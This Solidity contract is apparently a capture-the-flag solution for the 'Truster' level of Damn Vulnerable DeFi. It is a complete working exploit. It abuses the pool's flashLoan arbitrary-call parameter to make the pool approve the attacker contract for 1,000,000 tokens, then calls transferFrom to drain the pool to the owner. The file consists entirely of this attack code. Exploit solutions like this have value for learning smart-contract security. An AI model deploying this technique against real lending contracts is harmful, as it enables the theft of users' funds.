import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract HackTruster {
    address private owner;
    IERC20 private immutable damnVulnerableToken;
    TrusterLenderPool private pool;

    constructor(
        address _owner,
        address _tokenAddress,
        address _poolAddress
    ) {
        owner = _owner;
        damnVulnerableToken = IERC20(_tokenAddress);
        pool = TrusterLenderPool(_poolAddress);
    }

    function hack() public {
        pool.flashLoan(
            0,
            address(this),
            address(damnVulnerableToken),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                address(this),
                1000000000000000000000000
            )
        );

        damnVulnerableToken.transferFrom(
            address(pool),
            owner,
            1000000000000000000000000
        );
    }
}
